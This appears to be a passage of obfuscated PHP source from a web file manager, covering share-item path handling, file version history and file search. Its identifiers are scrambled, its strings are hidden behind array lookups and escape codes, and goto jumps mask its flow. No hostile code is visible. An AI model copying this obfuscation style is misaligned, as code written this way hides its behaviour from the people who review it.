unset($eâñˆ‹™äÜ); goto eô›³“ƒŸ; AµƒèÛÑÑ¹: } } class PathDriverDriverShareItem { public function __construct($F²µÆ²Ÿâ) { $this->pathParse = $F²µÆ²Ÿâ; } public function __call($c¾ô¡”Î’ò, $Fâ¸ĞÙŠ–´) { $båïÚ÷àáŸ =& $_SERVER[òÀöí]; if (method_exists($this, $c¾ô¡”Î’ò)) { return; } $b¾‘†ƒâí« = call_user_func_array(array($båïÚ÷àáŸ[1189], $c¾ô¡”Î’ò), $Fâ¸ĞÙŠ–´); $EÏšÑÉô´ = array($båïÚ÷àáŸ[1190], $båïÚ÷àáŸ[1191], $båïÚ÷àáŸ[1192], $båïÚ÷àáŸ[1193], $båïÚ÷àáŸ[507], $båïÚ÷àáŸ[509], $båïÚ÷àáŸ[1194], $båïÚ÷àáŸ[106], $båïÚ÷àáŸ[1195], $båïÚ÷àáŸ[1196]); if (in_array($c¾ô¡”Î’ò, $EÏšÑÉô´)) { $b¾‘†ƒâí« = $this->getPathOuter($b¾‘†ƒâí«); } return $b¾‘†ƒâí«; } public function copy($BÄ¶º¨Ñ£Ğ, $d´»¤„¥ºÖ, $F„Ş¿”¸ = false) { return $this->copyMove($BÄ¶º¨Ñ£Ğ, $d´»¤„¥ºÖ, $F„Ş¿”¸, $_SERVER[òÀöí][507]); } public function move($Eç‰”’½ï¢, $B¬”•ä•Ï¨, $CŒ¢¡¯–ñò = false) { return $this->copyMove($Eç‰”’½ï¢, $B¬”•ä•Ï¨, $CŒ¢¡¯–ñò, $_SERVER[òÀöí][509]); } private function copyMove($D´ìùÛ Ïø, $a»÷¿À…œ¢, $EÃ¦ØƒĞ©, $C÷×ÌÉÚíô) { goto EºïŸçñ´; báíÛˆ‹»: return $C‹Ãô–ƒª˜; goto C£–ø‘‘; b¿¤öÆ·–’: if ($f±˜³×â->pathParse[$eßáğî˜Õ¬[1026]]) { $a»÷¿À…œ¢ = $f±˜³×â->pathParse[$eßáğî˜Õ¬[1026]]; } else { $a»÷¿À…œ¢ = $bóŠÙôŞ; } $C‹Ãô–ƒª˜ = IO::copyMove($D´ìùÛ Ïø, $a»÷¿À…œ¢, $EÃ¦ØƒĞ©, $C÷×ÌÉÚíô); $C‹Ãô–ƒª˜ = $this->getPathOuter($C‹Ãô–ƒª˜); goto báíÛˆ‹»; EºïŸçñ´: $eßáğî˜Õ¬ =& $_SERVER[òÀöí]; $bóŠÙôŞ = $a»÷¿À…œ¢; $f±˜³×â = IO::driverMake($a»÷¿À…œ¢); goto b¿¤öÆ·–’; C£–ø‘‘: } public function pathThis($BÑèø©¢ëÉ) { return get_path_this($this->pathParse[$_SERVER[òÀöí][75]]); } public function pathFather($e³Ä†Å‡‰ª) { return get_path_father($this->pathParse[$_SERVER[òÀöí][75]]); } public function iconvSystem($AÍì—ˆŠ) { return $AÍì—ˆŠ; } protected function infoParse($EÜñ™Ğ‹˜¶, $dÅè–ÏÍß° = false) { $dê©Æ×í˜› =& $_SERVER[òÀöí]; $FôÓÈÖÊ… = $this->pathParse[$dê©Æ×í˜›[455]][$dê©Æ×í˜›[1049]] . $this->pathParse[$dê©Æ×í˜›[1042]]; if ($dÅè–ÏÍß°) { $C½‘á—å–æ = IO::infoWithChildren($FôÓÈÖÊ…); } else { $C½‘á—å–æ = IO::info($FôÓÈÖÊ…); } $C»ÁÒ÷ô = $this->pathParse[$dê©Æ×í˜›[455]]; return Action($dê©Æ×í˜›[1188])->_shareItemeParse($C½‘á—å–æ, $C»ÁÒ÷ô); } public function listAll($déø¨˜¹Æ) { $BÍá­³È” =& $_SERVER[òÀöí]; $c‰ò“¢ºÌ = IO::listAll($déø¨˜¹Æ); $d‘‡¥ëòÎ­ = $this->pathParse[$BÍá­³È”[455]]; foreach ($c‰ò“¢ºÌ as &$dÚÅ©Á½Ô) { check_abort(); $dÚÅ©Á½Ô = array_merge(IO::info($dÚÅ©Á½Ô[$BÍá­³È”[75]]), $dÚÅ©Á½Ô); $dÚÅ©Á½Ô[$BÍá­³È”[84]] = Action($BÍá­³È”[1188])->_shareItemeParse($dÚÅ©Á½Ô, $d‘‡¥ëòÎ­); } unset($dÚÅ©Á½Ô); return $c‰ò“¢ºÌ; } public function getPathOuter($cËÖÉ‡Ÿª÷) { goto B‘ñ“‡¾°¸; B‘ñ“‡¾°¸: $C”õŠã§À† =& $_SERVER[òÀöí]; $Cµ’›¦­Ş = KodIO::parse($cËÖÉ‡Ÿª÷); if ($Cµ’›¦­Ş[$C”õŠã§À†[29]] == KodIO::KOD_SHARE_ITEM) { return $Cµ’›¦­Ş[$C”õŠã§À†[75]]; } goto F„±ÈÎ‰Îä; fóÂ‰ƒçñ†: if (substr($b™Ä÷éÊ·‘, 0, strlen($d‹İ»ã–ƒ†)) != $d‹İ»ã–ƒ†) { return !1; } return $this->pathParse[$C”õŠã§À†[1043]] . $C”õŠã§À†[8] . ltrim($A»´Ç¨‚½, $C”õŠã§À†[8]); goto Càï•‰À¯§; F„±ÈÎ‰Îä: $b™Ä÷éÊ·‘ = KodIO::clear($cËÖÉ‡Ÿª÷); $d‹İ»ã–ƒ† = KodIO::clear($this->pathParse[$C”õŠã§À†[455]][$C”õŠã§À†[1049]]); $A»´Ç¨‚½ = substr($b™Ä÷éÊ·‘, strlen($d‹İ»ã–ƒ†)); goto fóÂ‰ƒçñ†; Càï•‰À¯§: } public function getType() { $añâ«˜´Ñ =& $_SERVER[òÀöí]; $f‹¾‚¥¥Ÿ· = str_replace($añâ«˜´Ñ[71], $añâ«˜´Ñ[33], get_class($this)); return strtolower($f‹¾‚¥¥Ÿ·); } public function isTypeObject($fé“£ƒ„ŸÊ) { return IO::isTypeObject($fé“£ƒ„ŸÊ); } public function info($e÷ÂÖ˜Õ„) { return $this->infoParse($e÷ÂÖ˜Õ„); } public function infoAuth($aÊ„Ø„–”ä) { return $this->infoParse($aÊ„Ø„–”ä); } public function infoWithChildren($E¡™ğÒØµ) { return $this->infoParse($E¡™ğÒØµ, !0); } public function infoFull($e×ÜÄ‘ñÔ‰) { return $this->infoParse($e×ÜÄ‘ñÔ‰); } } goto F¾Ş¬±èÙ; bÇ´ï¦š­§: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\x63\x65\137\x68\151\x73\x74\157\162\171"; public function historyCount($Eˆ†Õˆ²…¼) { goto a¸äğ¾ÏÃ¼; a¸äğ¾ÏÃ¼: $E°†·­ÊÚ =& $_SERVER[òÀöí]; if (!$Eˆ†Õˆ²…¼) { return array(); } if (is_string($Eˆ†Õˆ²…¼) || is_int($Eˆ†Õˆ²…¼)) { $Eˆ†Õˆ²…¼ = array($Eˆ†Õˆ²…¼); } goto Bß³»¯©¨; Bß³»¯©¨: $F ÌÚÚ©— = $E°†·­ÊÚ[1891]; $Bã °Øß‹Ê = array($E°†·­ÊÚ[387] => array($E°†·­ÊÚ[7], $Eˆ†Õˆ²…¼)); $e âêŸŠàÙ = $this->field($F ÌÚÚ©—)->where($Bã °Øß‹Ê)->group($E°†·­ÊÚ[387])->select(); goto AÉßÜ§êÕ¡; AÉßÜ§êÕ¡: return array_to_keyvalue($e âêŸŠàÙ, $E°†·­ÊÚ[387], $E°†·­ÊÚ[1696]); goto Dßà“ùÜí˜; Dßà“ùÜí˜: } public function addHistory($aŸƒĞØÍàï, $Bäß‘ÀéÒ = '') { $Fêˆ»èñ¼ =& $_SERVER[òÀöí]; $d»½ºİ–§µ = array($Fêˆ»èñ¼[401] => $aŸƒĞØÍàï[$Fêˆ»èñ¼[387]], $Fêˆ»èñ¼[1496] => isset($aŸƒĞØÍàï[$Fêˆ»èñ¼[397]]) ? $aŸƒĞØÍàï[$Fêˆ»èñ¼[397]] : $aŸƒĞØÍàï[$Fêˆ»èñ¼[396]], $Fêˆ»èñ¼[437] => $aŸƒĞØÍàï[$Fêˆ»èñ¼[436]], $Fêˆ»èñ¼[537] => $aŸƒĞØÍàï[$Fêˆ»èñ¼[77]], $Fêˆ»èñ¼[1892] => $Bäß‘ÀéÒ); $E—â†ë¤à„ = $GLOBALS[$Fêˆ»èñ¼[6]][$Fêˆ»èñ¼[87]][$Fêˆ»èñ¼[1081]]; if ($E—â†ë¤à„ > 1) { $this->historyAutoClear($d»½ºİ–§µ[$Fêˆ»èñ¼[387]]); $this->add($d»½ºİ–§µ); } Hook::trigger($Fêˆ»èñ¼[1893], $d»½ºİ–§µ); Model($Fêˆ»èñ¼[1894])->eventFileEdit($aŸƒĞØÍàï[$Fêˆ»èñ¼[387]]); } private function historyAutoClear($A›¶á«‡ä) { goto CåõŠã©Ãõ; AÉŒããˆÅº: $Cò³‘‚ÜÙå = array($bŠé÷Üù±º[401] => $A›¶á«‡ä); $e³¢´Ú›ù = $this->field($bŠé÷Üù±º[1895])->where($Cò³‘‚ÜÙå)->order($bŠé÷Üù±º[1888])->select(); if (!$e³¢´Ú›ù || $e³¬ä…½­… >= count($e³¢´Ú›ù)) { return; } goto D–¸Ö¹ô‡±; CåõŠã©Ãõ: $bŠé÷Üù±º =& $_SERVER[òÀöí]; $d£´÷‡ùÏ = Model($bŠé÷Üù±º[1102])->get($bŠé÷Üù±º[1103]); $b³¨ôĞ¡²¡ = $GLOBALS[$bŠé÷Üù±º[6]][$bŠé÷Üù±º[87]][$bŠé÷Üù±º[1081]]; goto b×Š’¤ê•¾; dßÂ“Öíš: $this->where($Cò³‘‚ÜÙå)->delete(); Model($bŠé÷Üù±º[439])->remove($eõˆ“ÈŞß); goto AÚ©–»¹œÇ; D–¸Ö¹ô‡±: $AìÉ¢èäè = array_to_keyvalue($e³¢´Ú›ù, $bŠé÷Üù±º[33], $bŠé÷Üù±º[385]); $AìÉ¢èäè = array_slice($AìÉ¢èäè, $e³¬ä…½­…); $eõˆ“ÈŞß = array_to_keyvalue($e³¢´Ú›ù, $bŠé÷Üù±º[33], $bŠé÷Üù±º[436]); goto A ŒÙÚªÏŠ; A ŒÙÚªÏŠ: $eõˆ“ÈŞß = array_slice($eõˆ“ÈŞß, $e³¬ä…½­…); if (!$AìÉ¢èäè || !$eõˆ“ÈŞß) { return; } $Cò³‘‚ÜÙå = array($bŠé÷Üù±º[403] => array($bŠé÷Üù±º[7], $AìÉ¢èäè)); goto dßÂ“Öíš; b×Š’¤ê•¾: $e³¬ä…½­… = $d£´÷‡ùÏ == $bŠé÷Üù±º[1104] ? 5 : $b³¨ôĞ¡²¡; if ($b³¨ôĞ¡²¡ <= 1) { $e³¬ä…½­… = 1; } if ($e³¬ä…½­… >= 500) { return; } goto AÉŒããˆÅº; AÚ©–»¹œÇ: } public function listData($Dáô–¸§‡) { goto bç¨…Ûé÷À; bç¨…Ûé÷À: $eùƒïÈ”‚Æ =& $_SERVER[òÀöí]; $eÈ¥ò÷îÙˆ = array($eùƒïÈ”‚Æ[401] => $Dáô–¸§‡); $c©Ï—„¹Ë  = $eùƒïÈ”‚Æ[1896]; goto døö™é–Œ; d¯°ôø›: $Bä›§ñëï = 5; if ($b‡ÒœÒ—¹ò == $eùƒïÈ”‚Æ[1104]) { $FÀøˆİ¯é[$eùƒïÈ”‚Æ[363]] = array_slice($FÀøˆİ¯é[$eùƒïÈ”‚Æ[363]], 0, $Bä›§ñëï); $FÀøˆİ¯é[$eùƒïÈ”‚Æ[360]] = array($eùƒïÈ”‚Æ[1897] => 1, $eùƒïÈ”‚Æ[1898] => 20, $eùƒïÈ”‚Æ[1899] => 1, $eùƒïÈ”‚Æ[1900] => count($FÀøˆİ¯é[$eùƒïÈ”‚Æ[363]])); } return $FÀøˆİ¯é; goto Eš†ÌËºÉ»; døö™é–Œ: $FÀøˆİ¯é = $this->field($c©Ï—„¹Ë )->where($eÈ¥ò÷îÙˆ)->order($eùƒïÈ”‚Æ[1888])->selectPage(); $this->_listAppendUser($FÀøˆİ¯é[$eùƒïÈ”‚Æ[363]]); $b‡ÒœÒ—¹ò = Model($eùƒïÈ”‚Æ[1102])->get($eùƒïÈ”‚Æ[1103]); goto d¯°ôø›; Eš†ÌËºÉ»: } protected function _listAppendUser(&$Aâ¯°ê¼ğæ) { $D¬ÖÏ»µ— =& $_SERVER[òÀöí]; $bî¯¤µ‹ËÇ = array_to_keyvalue($Aâ¯°ê¼ğæ, $D¬ÖÏ»µ—[33], $D¬ÖÏ»µ—[1504]); $Aññïãîé« = Model($D¬ÖÏ»µ—[495])->userListInfo($bî¯¤µ‹ËÇ); foreach ($Aâ¯°ê¼ğæ as &$cç ìÔôíÜ) { $d¤Ïˆ¢øé¼ = $cç ìÔôíÜ[$D¬ÖÏ»µ—[1504]]; $cç ìÔôíÜ[$D¬ÖÏ»µ—[396]] = $Aññïãîé«[$d¤Ïˆ¢øé¼] ? $Aññïãîé«[$d¤Ïˆ¢øé¼] : !1; } unset($cç ìÔôíÜ); } public function fileInfo($D•ÂšøÖßë) { $dÄÇÕ³¹›– =& $_SERVER[òÀöí]; $D×ºËÁöÛß = $this->tablePrefix; $e‚‹Éµ‡‰ = "{$D×ºËÁöÛß}\x69\157\137\x66\151\154\145\40\x66\151\x6c\x65\163\x20\x6f\156\40\146\x69\x6c\145\163\x2e\146\151\x6c\x65\111\104\40\x3d\40\150\x69\163\x74\x6f\162\171\56\146\151\154\145\x49\104"; return $this->alias($dÄÇÕ³¹›–[1901])->where(array($dÄÇÕ³¹›–[403] => $D•ÂšøÖßë))->join($e‚‹Éµ‡‰, $dÄÇÕ³¹›–[1902])->find(); } public function removeItem($añÜ©ØŠ«˜) { $EÍÃ£”Š« =& $_SERVER[òÀöí]; $e«¤ ôöóí = array($EÍÃ£”Š«[403] => $añÜ©ØŠ«˜); $aÜŞ‹„Ú™‘ = $this->where($e«¤ ôöóí)->find(); if ($aÜŞ‹„Ú™‘) { $b¿×›®ÌœŞ = $this->where($e«¤ ôöóí)->delete(); Model($EÍÃ£”Š«[439])->remove($aÜŞ‹„Ú™‘[$EÍÃ£”Š«[436]]); return $b¿×›®ÌœŞ; } return !1; } public function removeBySource($CøÓõ£ÎªÇ) { goto aŒßßˆØŒÈ; aŒßßˆØŒÈ: $F³‹ëœˆ‰ =& $_SERVER[òÀöí]; if (!$CøÓõ£ÎªÇ) { return !1; } if (!is_array($CøÓõ£ÎªÇ)) { $CøÓõ£ÎªÇ = array($CøÓõ£ÎªÇ); } goto CåèŒ›ƒ¹; CåèŒ›ƒ¹: $dÅæî”³»î = array($F³‹ëœˆ‰[401] => array($F³‹ëœˆ‰[7], $CøÓõ£ÎªÇ)); $E¿Ç¶˜Ùº = $this->field($F³‹ëœˆ‰[437])->where($dÅæî”³»î)->select(); if ($E¿Ç¶˜Ùº) { $this->where($dÅæî”³»î)->delete(); $b©ò¶ßÇ = array_to_keyvalue($E¿Ç¶˜Ùº, $F³‹ëœˆ‰[33], $F³‹ëœˆ‰[436]); Model($F³‹ëœˆ‰[439])->remove($b©ò¶ßÇ); } goto dƒ¸‰Œˆ‹; dƒ¸‰Œˆ‹: return !0; goto D‡²ÜÚ; D‡²ÜÚ: } public function setDetail($d‚‚Ì‘ªÂÏ, $dóààÛªÚ„) { $bİÁÌêáé =& $_SERVER[òÀöí]; return $this->where(array($bİÁÌêáé[403] => $d‚‚Ì‘ªÂÏ))->save(array($bİÁÌêáé[1892] => $dóààÛªÚ„)); } public function rollbackToItem($fãëæ¨“’ô, $EùŞ…†¸‚) { goto e—°ö‘ßÀ; e—°ö‘ßÀ: $e„ŠÛæºÇ =& $_SERVER[òÀöí]; $fàËµÛÃØ = Model($e„ŠÛæºÇ[778])->sourceInfo($fãëæ¨“’ô); $this->addHistory($fàËµÛÃØ, LNG($e„ŠÛæºÇ[1903])); goto Eßá¯Ë‘Š; eÃíßÈŒä: return $this->where(array($e„ŠÛæºÇ[403] => $EùŞ…†¸‚))->delete(); goto Fğ·«Š; Eßá¯Ë‘Š: $c­Ğ¸Ø¨Ó  = $this->find($EùŞ…†¸‚); $d£´ğÓ®„ò = array($e„ŠÛæºÇ[436] => $c­Ğ¸Ø¨Ó [$e„ŠÛæºÇ[436]], $e„ŠÛæºÇ[77] => $c­Ğ¸Ø¨Ó [$e„ŠÛæºÇ[77]], $e„ŠÛæºÇ[83] => time(), $e„ŠÛæºÇ[397] => USER_ID); Model($e„ŠÛæºÇ[778])->where(array($e„ŠÛæºÇ[387] => $fãëæ¨“’ô))->save($d£´ğÓ®„ò); goto eÃíßÈŒä; Fğ·«Š: } public function clearSame($FÍö¤Şòìò) { goto eÒè«÷‡Øé; eÒè«÷‡Øé: $dÔÉËŞ…‘³ =& $_SERVER[òÀöí]; $cØ£‹Øò± = $this->listData($FÍö¤Şòìò); $FÄÕ†’¤Íª = array_to_keyvalue_group($cØ£‹Øò±, $dÔÉËŞ…‘³[436]); goto A„äÀœ¡ôÕ; A„äÀœ¡ôÕ: $d‹¢µ¹œ½Æ = array(); $eİËÊÄğ» = array(); foreach ($FÄÕ†’¤Íª as $b”øÁİ¬“) { if (!$b”øÁİ¬“ || count($b”øÁİ¬“) <= 1) { continue; } foreach ($b”øÁİ¬“ as $c·–ÚƒÓÅó) { $d‹¢µ¹œ½Æ[] = $c·–ÚƒÓÅó[$dÔÉËŞ…‘³[436]]; $eİËÊÄğ»[] = $c·–ÚƒÓÅó[$dÔÉËŞ…‘³[385]]; } } goto bâ¦êÌóÔ¥; bâ¦êÌóÔ¥: if (!$eİËÊÄğ») { return; } $this->where(array($dÔÉËŞ…‘³[385] => array($dÔÉËŞ…‘³[7], $eİËÊÄğ»)))->delete(); Model($dÔÉËŞ…‘³[439])->remove($d‹¢µ¹œ½Æ); goto F‚ÚÏõÔø¯; F‚ÚÏõÔø¯: } public function userSpace() { $E¶Õ¹Š¤Ò =& $_SERVER[òÀöí]; $e˜Ø—¹¾ = $this->tablePrefix; $d®Œ‰¢Ôİ° = array($E¶Õ¹Š¤Ò[1496] => USER_ID); $DÇ‹‹õÀß = "{$e˜Ø—¹¾}\151\x6f\137\146\x69\x6c\145\x20\x66\151\x6c\x65\x73\40\157\156\x20\146\x69\x6c\x65\163\56\146\151\x6c\x65\x49\x44\40\75\40\x68\151\163\164\157\162\x79\x2e\x66\151\x6c\x65\x49\104"; return $this->alias($E¶Õ¹Š¤Ò[1901])->where($d®Œ‰¢Ôİ°)->join($DÇ‹‹õÀß, $E¶Õ¹Š¤Ò[1902])->sum($E¶Õ¹Š¤Ò[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($DÂ“ñƒáµÙ) { goto CÈÜÎÚ°õ‰; C¿Îï°æ‘¾: if (!$a®Ñ±ò¤) { return array(); } $D¶ÜİÀÌ = $a®Ñ±ò¤[$d©¨ƒˆèëñ[167]]; $Bâ—æ“˜Ş = $d©¨ƒˆèëñ[7]; goto cÄ§¥¬ˆ¨„; CÈÜÎÚ°õ‰: $d©¨ƒˆèëñ =& $_SERVER[òÀöí]; $F½†Ş»ƒ¯„ = KodIO::fileTypeList(); $a®Ñ±ò¤ = $F½†Ş»ƒ¯„[$DÂ“ñƒáµÙ]; goto C¿Îï°æ‘¾; cÄ§¥¬ˆ¨„: if (!$a®Ñ±ò¤[$d©¨ƒˆèëñ[167]]) { $F”ö´˜ö‚Ï = array_to_keyvalue($F½†Ş»ƒ¯„, $d©¨ƒˆèëñ[33], $d©¨ƒˆèëñ[167]); $D¶ÜİÀÌ = implode($d©¨ƒˆèëñ[47], $F”ö´˜ö‚Ï); $Bâ—æ“˜Ş = $d©¨ƒˆèëñ[1904]; } $e‡¥–ø´ˆ½ = explode($d©¨ƒˆèëñ[47], trim($D¶ÜİÀÌ, $d©¨ƒˆèëñ[47])); return array($Bâ—æ“˜Ş, $e‡¥–ø´ˆ½); goto d’ÚçîŠ¢; d’ÚçîŠ¢: } public function listPathType($eÍƒÌìî˜ñ) { $a†ö©ãå˜Ø =& $_SERVER[òÀöí]; $D¼ØˆˆÁ×— = $this->fileTypeWhere($eÍƒÌìî˜ñ); if (!$D¼ØˆˆÁ×—) { return array(); } $CÄÕó¸ç = array($a†ö©ãå˜Ø[538] => SourceModel::TYPE_USER, $a†ö©ãå˜Ø[539] => USER_ID, $a†ö©ãå˜Ø[535] => 0, $a†ö©ãå˜Ø[536] => $D¼ØˆˆÁ×—); return $this->listSource($CÄÕó¸ç); } public function listSearch($bˆã…Œñê, $A¾Š‹ªãÒá = 300) { goto fĞ®ğ•Šœ; fĞ®ğ•Šœ: $f´ÈÍóÏ =& $_SERVER[òÀöí]; if (isset($bˆã…Œñê[$f´ÈÍóÏ[1748]]) && $bˆã…Œñê[$f´ÈÍóÏ[1748]]) { $bˆã…Œñê[$f´ÈÍóÏ[1748]] = str_replace($f´ÈÍóÏ[376], $f´ÈÍóÏ[1905], trim($bˆã…Œñê[$f´ÈÍóÏ[1748]])); } $e¾‰­Ÿ¡Àã = $this->_parseSearchWhere($bˆã…Œñê); goto aÓÕËëÇĞ‚; eÏ’ãæ¨Â­: $this->_listSearchGroupTag($fÏ™Ö§±ª, $bˆã…Œñê, $d¥õ§çÔ»”); $this->_listDataApply($fÏ™Ö§±ª[$f´ÈÍóÏ[363]]); $this->_listMake($fÏ™Ö§±ª); goto EÈÒæ¥•ö; aÓÕËëÇĞ‚: if (!isset($e¾‰­Ÿ¡Àã[$f´ÈÍóÏ[414]])) { $e¾‰­Ÿ¡Àã[$f´ÈÍóÏ[414]] = 0; } $BïØé™Å§Ñ = $f´ÈÍóÏ[1906]; $d¥õ§çÔ»” = $BïØé™Å§Ñ; goto AÂßÓÏÜ¥ó; AÂßÓÏÜ¥ó: $this->_listSearchBindPinyin($bˆã…Œñê, $e¾‰­Ÿ¡Àã, $BïØé™Å§Ñ); $this->alias($f´ÈÍóÏ[505])->_makeOrder(); $e¾‰­Ÿ¡Àã = $this->parseWhereLike($e¾‰­Ÿ¡Àã); goto eËãæ•Ãšƒ; eËãæ•Ãšƒ: $fÏ™Ö§±ª = $this->distinct(!0)->field($BïØé™Å§Ñ)->where($e¾‰­Ÿ¡Àã)->selectPage($A¾Š‹ªãÒá); $this->_listSearchDesc($fÏ™Ö§±ª, $bˆã…Œñê, $d¥õ§çÔ»”); $this->_listSearchTag($fÏ™Ö§±ª, $bˆã…Œñê, $d¥õ§çÔ»”); goto eÏ’ãæ¨Â­; EÈÒæ¥•ö: return $fÏ™Ö§±ª; goto a’ò‚©ê; a’ò‚©ê: } private function _listSearchTag(&$Añ„‰Òó’º, $eŒ’®®Ú‡, $C…Üë‚øµø) { goto dµÃ“›‹; d§³³ƒŒ›: if (!$bÉ—ŒñÚõ) { return; } $F£ñËô¸¥‚ = array($E©˜×ìÑ…[410] => array($E©˜×ìÑ…[7], $bÉ—ŒñÚõ), $E©˜×ìÑ…[1504] => USER_ID); $BŠ‡Â‚“‹ = Model($E©˜×ìÑ…[411])->field($E©˜×ìÑ…[75])->where($F£ñËô¸¥‚)->select(); goto eç×­Ñ…°ø; dµÃ“›‹: $E©˜×ìÑ… =& $_SERVER[òÀöí]; if (!$eŒ’®®Ú‡[$E©˜×ìÑ…[1748]] || $Añ„‰Òó’º[$E©˜×ìÑ…[360]][$E©˜×ìÑ…[349]] > 1) { return; } $FìŒÕ‘÷œö = Model($E©˜×ìÑ…[1907])->listData(); goto a»Üô½ÉŸè; eç×­Ñ…°ø: $BŠ‡Â‚“‹ = array_to_keyvalue($BŠ‡Â‚“‹, $E©˜×ìÑ…[33], $E©˜×ìÑ…[75]); $c¸ÙÎ¯•èÑ = array_unique($BŠ‡Â‚“‹); $this->_listSearchMerge($Añ„‰Òó’º, $eŒ’®®Ú‡, $C…Üë‚øµø, $c¸ÙÎ¯•èÑ); goto Fò¤¯×Ã¥; a»Üô½ÉŸè: $bÉ—ŒñÚõ = array(); $D¶ó±ğ©•á = $eŒ’®®Ú‡[$E©˜×ìÑ…[1748]]; foreach ($FìŒÕ‘÷œö as $eô–…­Å¿‰) { $Bº¸…ƒ¿Ô‘ = $eô–…­Å¿‰[$E©˜×ìÑ…[28]]; $eÌİÅ²œÎá = str_replace($E©˜×ìÑ…[50], $E©˜×ìÑ…[33], Pinyin::encode($Bº¸…ƒ¿Ô‘)); if (stripos($Bº¸…ƒ¿Ô‘, $D¶ó±ğ©•á) !== !1 || stripos($eÌİÅ²œÎá, $D¶ó±ğ©•á) !== !1) { $bÉ—ŒñÚõ[] = $eô–…­Å¿‰[$E©˜×ìÑ…[385]]; } } goto d§³³ƒŒ›; Fò¤¯×Ã¥: } private function _listSearchDesc(&$b‰²œÙ›ªê, $b™…Ìç¼›ß, $Eƒ¥»òß™) { goto D‘öœ”¶ÜØ; FòÅ‚°¼Šœ: $eµ¿¨ÜñŒ = Model($eÁ•õ¡Ç¥Æ[521])->field($eÁ•õ¡Ç¥Æ[387])->where($Cà¦à‰„¥¡)->select(); $b æÃ›‰µÇ = array_to_keyvalue($eµ¿¨ÜñŒ, $eÁ•õ¡Ç¥Æ[33], $eÁ•õ¡Ç¥Æ[387]); $this->_listSearchMerge($b‰²œÙ›ªê, $b™…Ìç¼›ß, $Eƒ¥»òß™, $b æÃ›‰µÇ); goto DÌç‘ÃµˆÛ; D‘öœ”¶ÜØ: $eÁ•õ¡Ç¥Æ =& $_SERVER[òÀöí]; if (!$b™…Ìç¼›ß[$eÁ•õ¡Ç¥Æ[1748]] || $b‰²œÙ›ªê[$eÁ•õ¡Ç¥Æ[360]][$eÁ•õ¡Ç¥Æ[349]] > 1) { return; } $aËù¬ãŒ·ç = $this->listSearchChildren($b™…Ìç¼›ß[$eÁ•õ¡Ç¥Æ[479]]); goto Aù ÊÆÇÏ²; Aù ÊÆÇÏ²: $aËù¬ãŒ·ç = array_unique($aËù¬ãŒ·ç); if (!$aËù¬ãŒ·ç) { return; } $Cà¦à‰„¥¡ = array($eÁ•õ¡Ç¥Æ[387] => array($eÁ•õ¡Ç¥Æ[7], $aËù¬ãŒ·ç), $eÁ•õ¡Ç¥Æ[92] => $eÁ•õ¡Ç¥Æ[422], $eÁ•õ¡Ç¥Æ[368] => array($eÁ•õ¡Ç¥Æ[375], $eÁ•õ¡Ç¥Æ[1750] . $b™…Ìç¼›ß[$eÁ•õ¡Ç¥Æ[1748]] . $eÁ•õ¡Ç¥Æ[1750])); goto FòÅ‚°¼Šœ; DÌç‘ÃµˆÛ: } private function _listSearchGroupTag(&$eñğö‚”‰ê, $aÌÉŠ‚°½, $A×°ë´¢ˆŒ) { goto c…¸ÄÀÅ Ï; c…¸ÄÀÅ Ï: $BÒº°ƒ÷Æ• =& $_SERVER[òÀöí]; if (!$aÌÉŠ‚°½[$BÒº°ƒ÷Æ•[1748]] || $eñğö‚”‰ê[$BÒº°ƒ÷Æ•[360]][$BÒº°ƒ÷Æ•[349]] > 1 || !$aÌÉŠ‚°½[$BÒº°ƒ÷Æ•[479]]) { return; } $eĞ––ªÌç¡ = $this->sourceInfo($aÌÉŠ‚°½[$BÒº°ƒ÷Æ•[479]]); goto có¢¥‰—‰©; eæÖÚÌºùö: if (!$Fã‰ßí¸…‰) { return; } $d–ãˆçâÉÒ = array($BÒº°ƒ÷Æ•[410] => array($BÒº°ƒ÷Æ•[7], $Fã‰ßí¸…‰), $BÒº°ƒ÷Æ•[1504] => 0, $BÒº°ƒ÷Æ•[29] => $BÒº°ƒ÷Æ•[1768] . $AÛ‘Š³½š); $bÀíâ¥‰òä = Model($BÒº°ƒ÷Æ•[411])->field($BÒº°ƒ÷Æ•[75])->where($d–ãˆçâÉÒ)->select(); goto d¯¥½·ÛÑ»; d¯¥½·ÛÑ»: $bÀíâ¥‰òä = array_to_keyvalue($bÀíâ¥‰òä, $BÒº°ƒ÷Æ•[33], $BÒº°ƒ÷Æ•[75]); $bÒñêÀ¢ì¥ = array_unique($bÀíâ¥‰òä); $this->_listSearchMerge($eñğö‚”‰ê, $aÌÉŠ‚°½, $A×°ë´¢ˆŒ, $bÒñêÀ¢ì¥); goto E¯¯¸Œ á; Cµ¡ùâ¡Ú÷: $Fã‰ßí¸…‰ = array(); $bÆÒˆ­ÜÊ = $aÌÉŠ‚°½[$BÒº°ƒ÷Æ•[1748]]; foreach ($FîÜ›â‡ö“[$BÒº°ƒ÷Æ•[363]] as $EÒ‹Šçõ©Ö) { $c°×è‚°Å® = $EÒ‹Šçõ©Ö[$BÒº°ƒ÷Æ•[28]]; $BØ‹çØĞã» = str_replace($BÒº°ƒ÷Æ•[50], $BÒº°ƒ÷Æ•[33], Pinyin::encode($c°×è‚°Å®)); if (stripos($c°×è‚°Å®, $bÆÒˆ­ÜÊ) !== !1 || stripos($BØ‹çØĞã», $bÆÒˆ­ÜÊ) !== !1) { $Fã‰ßí¸…‰[] = $EÒ‹Šçõ©Ö[$BÒº°ƒ÷Æ•[385]]; } } goto eæÖÚÌºùö; có¢¥‰—‰©: if (!$eĞ––ªÌç¡ || $eĞ––ªÌç¡[$BÒº°ƒ÷Æ•[389]] != SourceModel::TYPE_GROUP) { return; } $AÛ‘Š³½š = $eĞ––ªÌç¡[$BÒº°ƒ÷Æ•[474]]; $FîÜ›â‡ö“ = Model($BÒº°ƒ÷Æ•[1908])->get($AÛ‘Š³½š); goto Cµ¡ùâ¡Ú÷; E¯¯¸Œ á: } private function _listSearchMerge(&$fÊ„°¢­ , $FåŒÓ™†ŒÔ, $DÚù§•ßß, $D„ïÏ‘Äè½) { goto Eš¥šŠŞš; a™èİ¯›ğ: $eÉÛ†•ùğ… = $this->field($DÚù§•ßß)->where($dî»§æº« )->select(); if (!$eÉÛ†•ùğ…) { return; } $Ašè¾ÉÄ±¬ = array(); goto dèóÚ­Æóô; dèóÚ­Æóô: foreach ($eÉÛ†•ùğ… as $DŞá„ä—Âì) { $D÷ìßœè™‰ = $FÚÑø¬“áò[47] . $FåŒÓ™†ŒÔ[$FÚÑø¬“áò[479]] . 